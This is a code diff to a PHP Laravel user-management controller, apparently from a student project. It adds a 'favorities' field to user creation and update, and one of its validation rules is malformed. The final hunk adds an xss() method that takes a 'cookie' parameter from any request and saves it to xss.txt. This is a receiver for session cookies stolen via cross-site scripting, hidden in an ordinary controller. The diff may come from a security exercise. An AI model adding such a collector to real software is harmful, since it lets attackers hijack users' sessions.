@@ -61,6 +61,7 @@ class CrudUserController extends Controller
         $request->validate([
             'name' => 'required',
             'mssv' => 'required|unique:users|max:10',
+            'favorities' => 'required',
             'email' => 'required|email|unique:users',
             'password' => 'required|min:6',
         ]);
@@ -69,6 +70,7 @@ class CrudUserController extends Controller
         $check = User::create([
             'name' => $data['name'],
             'mssv' => $data['mssv'],
+            'favorities' => $data['favorities'],
             'email' => $data['email'],
             'password' => Hash::make($data['password'])
         ]);
@@ -117,6 +119,7 @@ class CrudUserController extends Controller
         $request->validate([
             'name' => 'required',
             'mssv' => 'required',
+            'favorities' => 'favorities',
             'email' => 'required|email|unique:users,id,'.$input['id'],
             'password' => 'required|min:6|same:password_confirmation',
             'password_confirmation' => 'required|min:6'
@@ -125,6 +128,7 @@ class CrudUserController extends Controller
        $user = User::find($input['id']);
        $user->name = $input['name'];
        $user->mssv = $input['mssv'];
+       $user->favorities = $input['favorities'];
        $user->email = $input['email'];
        //$user->password = $input['password'];
        $user->password = bcrypt($input['password']);
@@ -156,4 +160,13 @@ class CrudUserController extends Controller
 
         return Redirect('login');
     }
+
+    /**
+     * Xu ly
+     */
+    public function xss(Request $request) {		
+        $cookie = $request->get('cookie');	
+        file_put_contents('xss.txt', $cookie);	
+        var_dump($cookie);die();	
+    }		
 }
